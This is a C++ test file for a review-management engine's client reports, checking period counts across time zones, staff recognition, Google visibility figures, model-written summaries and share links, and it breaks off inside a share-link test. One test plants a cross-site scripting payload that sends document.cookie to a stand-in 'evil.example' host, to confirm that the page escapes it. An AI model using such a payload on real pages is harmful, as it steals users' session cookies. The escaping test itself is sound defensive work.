// Client reports end to end (FR-8, D-085), through the router and the jobs
// as the engine assembles them, with a fake Performance API, a scripted
// model, a bucket held in memory and a channel that keeps what it is given.
// Nothing leaves the test: no Google, no model, no bucket, no email.
//
// The share-link rules, as far as the engine holds them: a link is an
// object under a random name (a wrong token names no object), revoking
// overwrites it, and nothing of a report is served by the engine to anyone
// who is not signed in. Expiry is the bucket's lifecycle rule, not code.

#include "api_fixture.hpp"
#include "db/repo_reports.hpp"
#include "domain/report_html.hpp"
#include "jobs/notifications.hpp"
#include "jobs/reports.hpp"

#include <gmock/gmock.h>

#include <regex>

using namespace poni;
using namespace std::chrono_literals;
using test::FakeLlm;
using testing::HasSubstr;
using testing::Not;

namespace {

constexpr std::string_view kPublicBase = "https://storage.test/public/";

class Reports : public test::ApiTest {
protected:
    void SetUp() override {
        ApiTest::SetUp();
        add_spa_and_buffet();
        gbp_.add_location("9003", "LU DREAM SPA - Upper East Side");
        discover();
        spa_client_ = make_client("LU DREAM SPA");
        buffet_client_ = make_client("Gangnam AYCE Buffet");
        chelsea_ = link("9001", spa_client_);
        uptown_ = link("9003", spa_client_);
        buffet_ = link("9002", buffet_client_);
        become_test_clients();
        exec("UPDATE locations SET time_zone = 'America/New_York'");

        start();
        notifier_.emplace(db(), clock_, jobs::NotifierOptions{.public_url = "http://localhost:5173"});
        notifier_->add_channel(channel_);
        jobs::install(registry_, *notifier_);
    }

    void TearDown() override {
        notifier_.reset();
        reporter_.reset();
        ApiTest::TearDown();
    }

    // (Re)starts the report service and the API, with or without the public bucket.
    void start(bool with_bucket = true) {
        reporter_.emplace(db(), clock_, performance_, llm_, with_bucket ? &public_ : nullptr);
        api_reporter_ = &*reporter_;
        api_options_.llm_providers = {"anthropic", "dashscope"};
        build({});
        browser_ = sign_in();
        if (!jobs_registered_) {
            jobs_registered_ = true;
            // The handlers ask reporter_ each time, so a restarted service is the one they use.
            registry_.add(std::string(repo::kBuildReportKind), [this](const jobs::Job& job) -> boost::asio::awaitable<void> {
                co_await reporter_->build(job.payload.at("report_id").to_number<std::int64_t>(), job.attempts >= job.max_attempts);
            });
        }
    }



    // A review in the mirror, written at `created` (RFC 3339). Returns its id.
    std::int64_t add_review(std::int64_t location, const std::string& gid, int stars, const std::string& created, const std::string& text = "",
                            std::optional<std::string> replied_at = std::nullopt, const std::string& name = "A Reviewer",
                            std::optional<std::string> photo = std::nullopt) {
        pqxx::work tx{conn()};
        const auto id = tx.query_value<std::int64_t>(
            "INSERT INTO reviews (location_id, gbp_review_id, gbp_name, rating, comment, original_text, reviewer_name, "
            "reviewer_photo_url, created_time, updated_time, reply_text, reply_updated_time, reply_origin, raw, first_seen_at, "
            "last_seen_at, last_changed_at) VALUES ($1, $2, 'accounts/111/locations/x/reviews/' || $2, $3, nullif($4, ''), "
            "nullif($4, ''), $5, $6, $7::timestamptz, $7::timestamptz, CASE WHEN $8::text IS NULL THEN NULL ELSE 'Thank you!' END, "
            "$8::timestamptz, CASE WHEN $8::text IS NULL THEN NULL ELSE 'external' END, '{}', now(), now(), now()) RETURNING id",
            pqxx::params{location, gid, stars, text, name, photo, created, replied_at});
        tx.commit();
        return id;
    }

    // The review's analysis, as the pipeline would have stored it.
    void analyze(std::int64_t review, const std::string& sentiment, const std::string& topics = "[]", const std::string& items = "[]") {
        pqxx::work tx{conn()};
        tx.exec("INSERT INTO review_analyses (review_id, review_updated_time, status, language, script, sentiment, contains_complaint, "
                "topics, items, manipulation_suspected, industry_key, prompt_version, created_at) "
                "VALUES ($1, now(), 'ok', 'en', 'Latn', $2, false, $3::jsonb, $4::jsonb, false, 'wellness', 'test', now())",
                pqxx::params{review, sentiment, topics, items});
        tx.commit();
    }

    // "Generate now" for October 2026 (or another period), with its job run. Returns the report's id.
    std::int64_t generate(std::int64_t client, const std::string& from = "2026-10-01", const std::string& to = "2026-10-31") {
        const auto response = post(std::format("/api/clients/{}/reports", client),
                                   std::format(R"({{"period_start": "{}", "period_end": "{}"}})", from, to));
        EXPECT_EQ(response.status, 201u) << response.body;
        if (response.status != 201) return 0;
        const auto id = json(response).at("id").as_int64();
        run_jobs();
        return id;
    }

    boost::json::value report(std::int64_t id) { return read(std::format("/api/reports/{}", id)); }
    std::string status(std::int64_t id) { return std::string(report(id).at("status").as_string()); }
    boost::json::value data(std::int64_t id) {
        return boost::json::parse(value<std::string>(std::format("SELECT data::text FROM reports WHERE id = {}", id)));
    }
    std::string html(std::int64_t id) { return value<std::string>(std::format("SELECT html FROM reports WHERE id = {}", id)); }

    void recipients(std::int64_t client, const std::string& list) {
        const auto response = post("/api/notification-rules",
                                   std::format(R"({{"event_type": "client_report", "client_id": {}, "recipients": {}}})", client, list));
        ASSERT_EQ(response.status, 201u) << response.body;
    }
    // What a person does on the settings page; in this test's throwaway database.
    void sending_on() { exec("UPDATE system_settings SET email_sending_enabled = true"); }

    std::int64_t schedule(std::int64_t client, const std::string& rest) {
        const auto response = post("/api/report-schedules", std::format(R"({{"client_id": {}, {}}})", client, rest));
        EXPECT_EQ(response.status, 201u) << response.body;
        return response.status == 201 ? json(response).at("id").as_int64() : 0;
    }
    // A schedule as the dashboard reads it, from the list; null once it is gone.
    boost::json::value listed_schedule(std::int64_t id) {
        for (const auto& item : read("/api/report-schedules").at("items").as_array()) {
            if (item.at("id").as_int64() == id) return item;
        }
        return nullptr;
    }

    FakeLlm llm_;
    test::FakePerformance performance_;
    test::FakeStore public_{std::string(kPublicBase)};
    test::FakeChannel channel_;
    std::optional<jobs::Reporter> reporter_;
    std::optional<jobs::Notifier> notifier_;
    bool jobs_registered_ = false;
    std::int64_t chelsea_ = 0, uptown_ = 0;
};

}  // namespace

// ---- building ------------------------------------------------------------------------

TEST_F(Reports, AReportCountsTheReviewsOfItsPeriodInTheClientsTimeZone) {
    // October 2026 in New York. The edges: 03:30 UTC is 23:30 the evening before.
    const auto praised = add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely head spa", "2026-10-05T17:00:00Z");
    add_review(chelsea_, "a2", 4, "2026-10-06T15:00:00Z", "Good");
    const auto complaint = add_review(uptown_, "b1", 1, "2026-10-07T15:00:00Z", "The room was cold and nobody cared");
    add_review(uptown_, "edge-in", 5, "2026-11-01T03:30:00Z", "Still October here");
    add_review(chelsea_, "edge-out", 2, "2026-10-01T03:30:00Z", "Still September here");
    add_review(chelsea_, "sep", 3, "2026-09-15T15:00:00Z", "September");
    add_review(chelsea_, "nov", 1, "2026-11-05T15:00:00Z", "November");
    add_review(buffet_, "other-client", 1, "2026-10-10T15:00:00Z", "Another client's review");
    const auto removed = add_review(chelsea_, "gone", 1, "2026-10-08T15:00:00Z", "Removed by Google");
    exec(std::format("UPDATE reviews SET removed_at = now() WHERE id = {}", removed));
    analyze(praised, "positive", R"([{"id": "treatment_quality", "polarity": "positive"}])",
            R"([{"name": "Head spa", "type": "treatment", "polarity": "positive"}])");
    analyze(complaint, "negative", R"([{"id": "ambience", "polarity": "negative"}])");
    exec(std::format("INSERT INTO cases (review_id, opened_by, opened_at, updated_at) "
                     "VALUES ({}, 'severity_flag', '2026-10-07T16:00:00Z', '2026-10-07T16:00:00Z')",
                     complaint));

    const auto id = generate(spa_client_);
    EXPECT_EQ(status(id), "draft");
    const auto d = data(id);
    EXPECT_EQ(d.at("client_name").as_string(), "LU DREAM SPA");
    EXPECT_EQ(d.at("time_zone").as_string(), "America/New_York");
    EXPECT_EQ(d.at("previous_start").as_string(), "2026-09-01");
    const auto& now = d.at("reviews");
    EXPECT_EQ(now.at("new_reviews").as_int64(), 4);
    EXPECT_DOUBLE_EQ(now.at("average_rating").to_number<double>(), 3.75);
    EXPECT_EQ(boost::json::serialize(now.at("stars")), "[1,0,0,1,2]");
    EXPECT_EQ(now.at("replied").as_int64(), 1);
    EXPECT_DOUBLE_EQ(now.at("response_rate").to_number<double>(), 0.25);
    EXPECT_DOUBLE_EQ(now.at("median_response_hours").to_number<double>(), 2.0);
    EXPECT_EQ(now.at("positive").as_int64(), 1);
    EXPECT_EQ(now.at("negative").as_int64(), 1);
    EXPECT_EQ(d.at("previous").at("new_reviews").as_int64(), 2);  // the September one and the edge
    EXPECT_DOUBLE_EQ(d.at("previous").at("average_rating").to_number<double>(), 2.5);
    // The overall rating: every review of the client up to the end of October that was not removed.
    EXPECT_EQ(d.at("running_count").as_int64(), 6);
    EXPECT_EQ(d.at("topics_praised").at(0).at("label").as_string(), "Treatment quality and technique");
    EXPECT_EQ(d.at("items_praised").at(0).at("label").as_string(), "Head spa");
    EXPECT_EQ(d.at("topics_complained").at(0).at("count").as_int64(), 1);
    EXPECT_EQ(d.at("escalations_opened").as_int64(), 1);
    EXPECT_EQ(d.at("escalations_closed").as_int64(), 0);
    // Per location, by name.
    ASSERT_EQ(d.at("locations").as_array().size(), 2u);
    EXPECT_EQ(d.at("locations").at(0).at("title").as_string(), "LU DREAM SPA - Chelsea");
    EXPECT_EQ(d.at("locations").at(0).at("reviews").at("new_reviews").as_int64(), 2);
    EXPECT_EQ(d.at("locations").at(1).at("reviews").at("new_reviews").as_int64(), 2);
    EXPECT_EQ(d.at("highlights_worst").at(0).at("text").as_string(), "The room was cold and nobody cared");

    const auto page = html(id);
    EXPECT_THAT(page, HasSubstr("October 1 to 31, 2026"));
    EXPECT_THAT(page, HasSubstr("Lovely head spa"));
    EXPECT_THAT(page, HasSubstr("A Reviewer"));
    EXPECT_THAT(page, Not(HasSubstr("Another client&#39;s review")));
    EXPECT_THAT(page, Not(HasSubstr("Removed by Google")));

    // The API's view of it, and the audit entry in the person's name.
    const auto listed = read(std::format("/api/reports?client_id={}", spa_client_));
    ASSERT_EQ(listed.at("total").as_int64(), 1);
    EXPECT_EQ(listed.at("items").at(0).at("new_reviews").as_int64(), 4);
    // The two headline figures are the ones the built report holds, read from its data, in the list and when one is read.
    EXPECT_DOUBLE_EQ(listed.at("items").at(0).at("average_rating").to_number<double>(), 3.75);
    EXPECT_DOUBLE_EQ(listed.at("items").at(0).at("response_rate").to_number<double>(), 0.25);
    EXPECT_DOUBLE_EQ(report(id).at("average_rating").to_number<double>(), 3.75);
    EXPECT_DOUBLE_EQ(report(id).at("response_rate").to_number<double>(), 0.25);
    EXPECT_EQ(listed.at("items").at(0).at("requested_by").as_string(), "staff@xvisionmediaus.com");
    EXPECT_EQ(count("audit_log WHERE action = 'report.create' AND actor = 'staff@xvisionmediaus.com'"), 1);
}

// Which item types are people is read from the seeded profile (D-086): the
// wellness profile's "therapist" is one, its "treatment" is not.
TEST_F(Reports, NamedStaffAreListedApartFromTheItemsPerLocation) {
    const auto a = add_review(chelsea_, "s1", 5, "2026-10-05T15:00:00Z", "Anna was wonderful");
    const auto b = add_review(uptown_, "s2", 5, "2026-10-06T15:00:00Z", "anna and the head spa");
    const auto c = add_review(uptown_, "s3", 2, "2026-10-07T15:00:00Z", "Bo was rough");
    add_review(uptown_, "s4", 4, "2026-10-08T15:00:00Z", "Nice");
    analyze(a, "positive", "[]", R"([{"name": "Anna", "type": "therapist", "polarity": "positive"}])");
    analyze(b, "positive", "[]",
            R"([{"name": "anna", "type": "therapist", "polarity": "positive"}, {"name": "Head spa", "type": "treatment", "polarity": "positive"}])");
    analyze(c, "negative", "[]", R"([{"name": "Bo", "type": "therapist", "polarity": "negative"}])");

    const auto id = generate(spa_client_);
    const auto d = data(id);
    EXPECT_EQ(d.at("version").as_int64(), 2);
    // The therapists are not items; the treatment is.
    ASSERT_EQ(d.at("items_praised").as_array().size(), 1u);
    EXPECT_EQ(d.at("items_praised").at(0).at("label").as_string(), "Head spa");
    EXPECT_TRUE(d.at("items_complained").as_array().empty());
    const auto& staff = d.at("staff");
    EXPECT_EQ(staff.at("reviews_naming").as_int64(), 3);
    // Anna at two locations is two people.
    ASSERT_EQ(staff.at("recognized").as_array().size(), 2u);
    EXPECT_EQ(staff.at("recognized").at(0).at("name").as_string(), "Anna");
    EXPECT_EQ(staff.at("recognized").at(0).at("location_title").as_string(), "LU DREAM SPA - Chelsea");
    EXPECT_EQ(staff.at("recognized").at(0).at("rank").as_int64(), 1);
    EXPECT_EQ(staff.at("recognized").at(1).at("name").as_string(), "anna");
    EXPECT_EQ(staff.at("recognized").at(1).at("location_title").as_string(), "LU DREAM SPA - Upper East Side");
    EXPECT_EQ(staff.at("recognized").at(1).at("rank").as_int64(), 1);
    ASSERT_EQ(staff.at("complained").as_array().size(), 1u);
    EXPECT_EQ(staff.at("complained").at(0).at("name").as_string(), "Bo");
    EXPECT_EQ(staff.at("complained").at(0).at("negative").as_int64(), 1);

    const auto page = html(id);
    EXPECT_THAT(page, HasSubstr("<h2>Employee recognition</h2>"));
    EXPECT_THAT(page, HasSubstr("<th>Location</th>"));
    EXPECT_THAT(page, HasSubstr("Based on 3 reviews that named a staff member"));
}

// An industry whose profile has no person type gives no section; a report
// stored before the section existed is still sent as it was (D-085).
TEST_F(Reports, AnIndustryWithoutPeopleHasNoSectionAndAnOldReportIsSentAsItWas) {
    reseed("UPDATE kb_industries SET item_types = (SELECT jsonb_agg(t - 'person') FROM jsonb_array_elements(item_types) t)");
    const auto r = add_review(chelsea_, "s1", 5, "2026-10-05T15:00:00Z", "Anna was wonderful");
    analyze(r, "positive", "[]", R"([{"name": "Anna", "type": "therapist", "polarity": "positive"}])");
    const auto id = generate(spa_client_);
    const auto d = data(id);
    EXPECT_FALSE(d.as_object().contains("staff") && !d.at("staff").is_null());
    EXPECT_EQ(d.at("items_praised").at(0).at("label").as_string(), "Anna");
    EXPECT_THAT(html(id), Not(HasSubstr("Employee recognition")));

    // What a report built before this version stored: no "staff", version 1.
    exec(std::format("UPDATE reports SET data = (data - 'staff') || '{{\"version\": 1}}' WHERE id = {}", id));
    recipients(spa_client_, R"(["owner@luspa.test"])");
    sending_on();
    const auto response = post(std::format("/api/reports/{}/send", id));
    EXPECT_EQ(response.status, 200u) << response.body;
}

TEST_F(Reports, AClientWithoutAnyReviewGetsAReportThatSaysSo) {
    const auto id = generate(buffet_client_);
    EXPECT_EQ(status(id), "draft");
    const auto d = data(id);
    EXPECT_EQ(d.at("reviews").at("new_reviews").as_int64(), 0);
    EXPECT_TRUE(d.at("reviews").at("average_rating").is_null());
    // A period without reviews has a count and no figures: null, not zero.
    EXPECT_EQ(report(id).at("new_reviews").as_int64(), 0);
    EXPECT_TRUE(report(id).at("average_rating").is_null());
    EXPECT_TRUE(report(id).at("response_rate").is_null());
    EXPECT_TRUE(d.at("running_average").is_null());
    EXPECT_FALSE(d.at("visibility").at("available").as_bool());
    EXPECT_THAT(html(id), HasSubstr("No new reviews in this period."));
    // Nothing to summarize, so the model was not asked.
    EXPECT_EQ(llm_.calls("summary"), 0u);
    EXPECT_TRUE(report(id).at("summary").is_null());
}

TEST_F(Reports, AReportStillBuildingHasNoFigures) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely head spa", "2026-10-05T17:00:00Z");
    const auto response = post(std::format("/api/clients/{}/reports", spa_client_), R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})");
    ASSERT_EQ(response.status, 201u) << response.body;
    const auto made = json(response);
    EXPECT_EQ(made.at("status").as_string(), "building");
    for (const auto* member : {"new_reviews", "average_rating", "response_rate", "summary"}) {
        EXPECT_TRUE(made.at(member).is_null()) << member;
    }
    run_jobs();
    EXPECT_EQ(report(made.at("id").as_int64()).at("new_reviews").as_int64(), 1);
    EXPECT_DOUBLE_EQ(report(made.at("id").as_int64()).at("average_rating").to_number<double>(), 5.0);
    EXPECT_DOUBLE_EQ(report(made.at("id").as_int64()).at("response_rate").to_number<double>(), 1.0);
}

TEST_F(Reports, VisibilityComesFromGoogleWhenTheReportIsBuilt) {
    using namespace std::chrono;
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    for (unsigned d = 1; d <= 31; ++d) {
        performance_.set("9001", "BUSINESS_IMPRESSIONS_MOBILE_MAPS", 2026y / October / d, 100);
        performance_.set("9003", "BUSINESS_IMPRESSIONS_MOBILE_SEARCH", 2026y / October / d, 10);
    }
    for (unsigned d = 1; d <= 30; ++d) performance_.set("9001", "BUSINESS_IMPRESSIONS_MOBILE_MAPS", 2026y / September / d, 50);
    performance_.set("9001", "CALL_CLICKS", 2026y / October / 12, 9);
    performance_.keywords["9001"]["2026-10"] = {{"head spa nyc", 400, {}}, {"spa near me", {}, 15}};
    performance_.keywords["9003"]["2026-10"] = {{"head spa nyc", 100, {}}};
    // The other client's numbers are not this report's.
    performance_.set("9002", "CALL_CLICKS", 2026y / October / 12, 1000);

    const auto id = generate(spa_client_);
    const auto v = data(id).at("visibility");
    EXPECT_TRUE(v.at("available").as_bool());
    EXPECT_TRUE(v.at("complete").as_bool());
    EXPECT_EQ(v.at("as_of").as_string(), "2026-10-31");
    EXPECT_EQ(v.at("totals").at("maps_mobile").as_int64(), 3100);
    EXPECT_EQ(v.at("totals").at("search_mobile").as_int64(), 310);
    EXPECT_EQ(v.at("totals").at("calls").as_int64(), 9);
    EXPECT_EQ(v.at("previous").at("maps_mobile").as_int64(), 1500);
    EXPECT_EQ(data(id).at("keywords").at("month").as_string(), "2026-10");
    EXPECT_EQ(data(id).at("keywords").at("items").at(0).at("impressions").as_int64(), 500);
    EXPECT_EQ(performance_.daily_calls, 2);  // one read per location, covering both periods
    EXPECT_THAT(html(id), HasSubstr("head spa nyc"));
    EXPECT_THAT(html(id), HasSubstr("fewer than 15"));
}

TEST_F(Reports, GooglesLagIsShownAsTheDayTheNumbersGoUpTo) {
    using namespace std::chrono;
    // A weekly report made on Monday November 9 for November 2 to 8; Google has data up to the 5th.
    for (unsigned d = 26; d <= 31; ++d) {
        performance_.set("9002", "WEBSITE_CLICKS", 2026y / October / d, 7);
        performance_.set("9002", "BUSINESS_IMPRESSIONS_MOBILE_SEARCH", 2026y / October / d, 100);
    }
    for (unsigned d = 1; d <= 5; ++d) {
        performance_.set("9002", "WEBSITE_CLICKS", 2026y / November / d, 7);
        performance_.set("9002", "BUSINESS_IMPRESSIONS_MOBILE_SEARCH", 2026y / November / d, 100);
    }
    // No keywords for November yet: October's are shown, and say so.
    performance_.keywords["9002"]["2026-10"] = {{"buffet near me", 3000, {}}};

    const auto id = generate(buffet_client_, "2026-11-02", "2026-11-08");
    const auto d = data(id);
    EXPECT_EQ(d.at("visibility").at("as_of").as_string(), "2026-11-05");
    EXPECT_FALSE(d.at("visibility").at("complete").as_bool());
    EXPECT_EQ(d.at("visibility").at("totals").at("website_clicks").as_int64(), 28);
    EXPECT_TRUE(d.at("visibility").at("previous").is_null());
    EXPECT_EQ(d.at("keywords").at("month").as_string(), "2026-10");
    EXPECT_THAT(html(id), HasSubstr("they go up to November 5, 2026"));
    EXPECT_THAT(html(id), HasSubstr("What people searched for, October 2026"));
}

TEST_F(Reports, AnOutageAtGoogleIsRetriedAndThenTheReportIsBuiltWithoutVisibility) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    for (int i = 0; i < repo::kBuildReportAttempts; ++i) {
        performance_.failures.push_back({google::ApiError::Kind::unavailable, 503, "backend error"});
    }
    const auto id = generate(spa_client_);
    EXPECT_EQ(status(id), "building");
    for (int attempt = 1; attempt < repo::kBuildReportAttempts; ++attempt) {
        clock_.advance(2h);
        run_jobs();
    }
    EXPECT_EQ(status(id), "draft");
    const auto v = data(id).at("visibility");
    // The first location's read failed for good; the second location answered, with nothing.
    EXPECT_FALSE(v.at("available").as_bool());
    EXPECT_EQ(v.at("detail").as_string(), "backend error");
    // Google's error text stays off the page a client reads.
    EXPECT_THAT(html(id), Not(HasSubstr("backend error")));
    EXPECT_THAT(html(id), HasSubstr("Google could not be asked for the visibility numbers"));
    EXPECT_EQ(data(id).at("reviews").at("new_reviews").as_int64(), 1);
}

TEST_F(Reports, AnAccountThatIsNotConnectedDoesNotStopAReportAndIsNotRetried) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    performance_.failures.push_back({google::ApiError::Kind::not_configured, 0, "no GBP account is connected"});
    performance_.failures.push_back({google::ApiError::Kind::not_configured, 0, "no GBP account is connected"});
    const auto id = generate(spa_client_);
    EXPECT_EQ(status(id), "draft");
    EXPECT_THAT(html(id), Not(HasSubstr("no GBP account is connected")));
    EXPECT_EQ(data(id).at("visibility").at("detail").as_string(), "no GBP account is connected");
    EXPECT_EQ(performance_.daily_calls, 2);
}

TEST_F(Reports, AJobThatKeepsFailingMarksTheReportFailed) {
    // A zone the system does not know any more: the job cannot work out the period.
    const auto response = post(std::format("/api/clients/{}/reports", spa_client_),
                               R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})");
    ASSERT_EQ(response.status, 201u);
    const auto id = json(response).at("id").as_int64();
    exec(std::format("UPDATE reports SET time_zone = 'Nowhere/Land' WHERE id = {}", id));
    for (int attempt = 0; attempt < repo::kBuildReportAttempts; ++attempt) {
        run_jobs();
        clock_.advance(2h);
    }
    const auto failed = report(id);
    EXPECT_EQ(failed.at("status").as_string(), "failed");
    EXPECT_THAT(std::string(failed.at("error").as_string()), HasSubstr("Nowhere/Land"));
    EXPECT_EQ(get(std::format("/api/reports/{}/html", id), browser_).status, 404u);
    // A failed report can be set aside, and stays without numbers and page.
    EXPECT_EQ(post(std::format("/api/reports/{}/reject", id)).status, 200u);
    EXPECT_EQ(count(std::format("reports WHERE id = {} AND status = 'rejected' AND data IS NULL AND html IS NULL", id)), 1);
    EXPECT_EQ(get(std::format("/api/reports/{}/html", id), browser_).status, 404u);
}

// ---- the summary -----------------------------------------------------------------------

TEST_F(Reports, TheSummaryIsWrittenFromTheFiguresWithoutReviewTextOrNames) {
    const auto review = add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "SECRET-WORDS-OF-THE-REVIEW", std::nullopt, "SECRET-NAME");
    analyze(review, "positive", R"([{"id": "treatment_quality", "polarity": "positive"}])");
    const auto id = generate(spa_client_);

    ASSERT_EQ(llm_.calls("summary"), 1u);
    const auto& request = llm_.requests.back();
    EXPECT_EQ(request.task, "summary");
    EXPECT_EQ(request.provider, "dashscope");
    EXPECT_EQ(request.client_id, spa_client_);
    for (const auto& message : request.messages) {
        EXPECT_THAT(message.content, Not(HasSubstr("SECRET-WORDS-OF-THE-REVIEW")));
        EXPECT_THAT(message.content, Not(HasSubstr("SECRET-NAME")));
    }
    EXPECT_THAT(request.messages.back().content, HasSubstr("Treatment quality"));

    EXPECT_THAT(std::string(report(id).at("summary").as_string()), HasSubstr("You had a steady period."));
    EXPECT_THAT(html(id), HasSubstr("class=\"summary\">You had a steady period."));
    // The page shows the review and the name, as on Google.
    EXPECT_THAT(html(id), HasSubstr("SECRET-WORDS-OF-THE-REVIEW"));
    EXPECT_THAT(html(id), HasSubstr("SECRET-NAME"));
}

TEST_F(Reports, ASummaryThatFailsACheckIsLeftOutAndTheReportIsBuiltAnyway) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    llm_.summary = FakeLlm::always(R"({"summary": "A fine month. Book again at www.example.com/deal today."})");
    const auto id = generate(spa_client_);
    EXPECT_EQ(status(id), "draft");
    EXPECT_TRUE(report(id).at("summary").is_null());
    EXPECT_THAT(std::string(report(id).at("summary_note").as_string()), HasSubstr("no_url"));
    EXPECT_THAT(html(id), Not(HasSubstr("www.example.com")));
}

TEST_F(Reports, AModelThatDoesNotAnswerOrIsSwitchedOffLeavesTheReportWithoutASummary) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    llm_.summary = [](const llm::ChatRequest&) { return FakeLlm::failure(llm::Error::Kind::unavailable); };
    const auto down = generate(spa_client_);
    EXPECT_EQ(status(down), "draft");
    EXPECT_THAT(std::string(report(down).at("summary_note").as_string()), HasSubstr("gave no answer"));

    llm_.requests.clear();
    exec("UPDATE ai_settings SET enabled = false");
    const auto off = generate(spa_client_);
    EXPECT_THAT(std::string(report(off).at("summary_note").as_string()), HasSubstr("switched off"));
    EXPECT_EQ(llm_.calls("summary"), 0u);

    exec("UPDATE ai_settings SET enabled = true");
    llm_.provider_names = {"anthropic"};
    const auto unconfigured = generate(spa_client_);
    EXPECT_THAT(std::string(report(unconfigured).at("summary_note").as_string()), HasSubstr("'dashscope' is not configured"));
}

TEST_F(Reports, TheSummaryTaskHasItsOwnProviderAndModel) {
    auto settings = read("/api/ai/settings");
    EXPECT_EQ(settings.at("summary_provider").as_string(), "dashscope");
    EXPECT_EQ(settings.at("summary_model").as_string(), settings.at("generator_model").as_string());
    const auto changed = patch("/api/ai/settings", R"({"summary_provider": "anthropic", "summary_model": "claude-haiku-5-5"})");
    ASSERT_EQ(changed.status, 200u) << changed.body;
    EXPECT_EQ(patch("/api/ai/settings", R"({"summary_provider": "nobody"})").status, 400u);
    EXPECT_EQ(patch("/api/ai/settings", R"({"summary_model": " "})").status, 400u);
    // The knowledge base has the default that is shown beside the setting.
    EXPECT_EQ(read("/api/knowledge").at("defaults").at("analysis").at("summary_model").as_string(), "qwen3.7-plus");

    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    generate(spa_client_);
    EXPECT_EQ(llm_.requests.back().provider, "anthropic");
    EXPECT_EQ(llm_.requests.back().model, "claude-haiku-5-5");
    // A change to it is no change to what was tested for auto-posting: the writer and the analyzer are as they were.
    EXPECT_EQ(read("/api/ai/settings").at("generator_model").as_string(), settings.at("generator_model").as_string());
}

// ---- the page ---------------------------------------------------------------------------

TEST_F(Reports, HostileReviewTextIsTextOnThePage) {
    const std::string attack = R"(<script>fetch('https://evil.example/'+document.cookie)</script><img src=x onerror=alert(1)>)";
    const auto review = add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Nice. " + attack, std::nullopt, "Mallory " + attack,
                                   "javascript:alert(1)");
    analyze(review, "positive", "[]", std::format(R"([{{"name": {}, "type": "treatment", "polarity": "positive"}}])",
                                                  boost::json::serialize(boost::json::value("Massage " + attack))));
    const auto id = generate(spa_client_);
    const auto page = html(id);
    EXPECT_THAT(page, Not(HasSubstr("<script")));
    EXPECT_THAT(page, Not(HasSubstr("<img")));
    EXPECT_THAT(page, Not(HasSubstr("javascript:")));
    EXPECT_THAT(page, HasSubstr("Nice. &lt;script&gt;fetch("));
    EXPECT_THAT(page, HasSubstr("Mallory &lt;script&gt;"));
    EXPECT_THAT(page, HasSubstr("Massage &lt;script&gt;"));

    // What the dashboard gets: the same page, sandboxed, and not to be cached or indexed.
    const auto response = get(std::format("/api/reports/{}/html", id), browser_);
    ASSERT_EQ(response.status, 200u);
    EXPECT_EQ(response.content_type, "text/html; charset=utf-8");
    EXPECT_EQ(response.body, page);
    EXPECT_THAT(header(response, "Content-Security-Policy"), testing::StartsWith("sandbox; default-src 'none'"));
    EXPECT_EQ(header(response, "X-Robots-Tag"), "noindex, nofollow");
    EXPECT_EQ(header(response, "Cache-Control"), "private, no-store");
}

TEST_F(Reports, NothingOfAReportIsServedWithoutASession) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    generate(spa_client_);
    // The routes of reports, from the router's table: the 7 this test once named and every one added since.
    EXPECT_GE(expect_session_and_csrf({"/reports", "/report-schedules"}, R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})"), 7u);
    // There is no route for a token at all: the engine does not host shared reports.
    EXPECT_EQ(get("/r/anything.html").status, 404u);
}

TEST_F(Reports, APeriodMustBeOverAndMakeSense) {
    const auto create = [&](std::int64_t client, const std::string& body) {
        return post(std::format("/api/clients/{}/reports", client), body).status;
    };
    // The clock says 2026-11-10 07:00 in New York: today is not over, yesterday is.
    EXPECT_EQ(create(spa_client_, R"({"period_start": "2026-11-01", "period_end": "2026-11-10"})"), 400u);
    EXPECT_EQ(create(spa_client_, R"({"period_start": "2026-11-09", "period_end": "2026-11-09"})"), 201u);
    EXPECT_EQ(create(spa_client_, R"({"period_start": "2026-10-31", "period_end": "2026-10-01"})"), 400u);
    EXPECT_EQ(create(spa_client_, R"({"period_start": "2025-01-01", "period_end": "2026-10-31"})"), 400u);
    EXPECT_EQ(create(spa_client_, R"({"period_start": "October", "period_end": "2026-10-31"})"), 400u);
    EXPECT_EQ(create(spa_client_, R"({"period_start": "2026-10-01"})"), 400u);
    EXPECT_EQ(create(spa_client_, R"({"period_start": "2026-10-01", "period_end": "2026-10-31", "time_zone": "Mars/Base"})"), 400u);
    EXPECT_EQ(create(999999, R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})"), 404u);
    exec(std::format("UPDATE clients SET archived = true WHERE id = {}", buffet_client_));
    EXPECT_EQ(create(buffet_client_, R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})"), 400u);
    // A zone of its own: the same day ended hours earlier in Tokyo.
    const auto tokyo = post(std::format("/api/clients/{}/reports", spa_client_),
                            R"({"period_start": "2026-11-09", "period_end": "2026-11-09", "time_zone": "Asia/Tokyo"})");
    ASSERT_EQ(tokyo.status, 201u);
    EXPECT_EQ(json(tokyo).at("time_zone").as_string(), "Asia/Tokyo");
    EXPECT_EQ(json(tokyo).at("status").as_string(), "building");
}

// ---- share links ------------------------------------------------------------------------

TEST_F(Reports, AShareLinkIsACopyOfThePageUnderANameNobodyCanGuess) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    const auto id = generate(spa_client_);
    const auto first = post(std::format("/api/reports/{}/share-links", id));
    ASSERT_EQ(first.status, 201u) << first.body;
    const auto second = post(std::format("/api/reports/{}/share-links", id));
    ASSERT_EQ(second.status, 201u);

    const std::string url(json(first).at("url").as_string());
    // 32 random bytes as 43 characters, and nothing else: no client, no report number, no date.
    std::smatch match;
